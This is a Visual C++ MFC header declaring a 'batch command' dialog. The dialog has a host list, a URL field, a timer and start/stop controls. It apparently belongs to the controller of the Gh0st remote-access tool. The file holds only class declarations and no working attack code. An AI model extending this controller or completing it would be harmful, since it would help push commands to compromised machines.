#if !defined(AFX_BATCHCOMMAND_H__5D862469_223F_4A05_AA4A_748A0C744A78__INCLUDED_)
#define AFX_BATCHCOMMAND_H__5D862469_223F_4A05_AA4A_748A0C744A78__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000
// BatchCommand.h : header file
//

/////////////////////////////////////////////////////////////////////////////
// CBatchCommand dialog
#include "gh0stView.h"

class CBatchCommand : public CDialog
{
// Construction
public:
	CBatchCommand(CWnd* pParent = NULL);   // standard constructor
	CGh0stView *Point;
	static DWORD CountHost;
// Dialog Data
	//{{AFX_DATA(CBatchCommand)
	enum { IDD = IDD_BTACK_DIALOG };
	CSpinButtonCtrl	m_Spin_Time;
	CComboBox	m_Combo;
	CListCtrl	m_list;
	CString	m_Url;
	UINT	m_Time;
	BOOL	m_Auto;
	BOOL	m_Select;
	//}}AFX_DATA


// Overrides
	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CBatchCommand)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL

// Implementation
protected:

	// Generated message map functions
	//{{AFX_MSG(CBatchCommand)
	virtual BOOL OnInitDialog();
	afx_msg void OnClose();
	afx_msg void OnRclickList1(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg void OnAddbatch();
	afx_msg void OnDeletebatch();
	afx_msg void OnButtonStart();
	afx_msg void OnButtonStop();
	afx_msg void OnTimer(UINT nIDEvent);
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
private:
	BOOL MarkStart;
};

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_BATCHCOMMAND_H__5D862469_223F_4A05_AA4A_748A0C744A78__INCLUDED_)
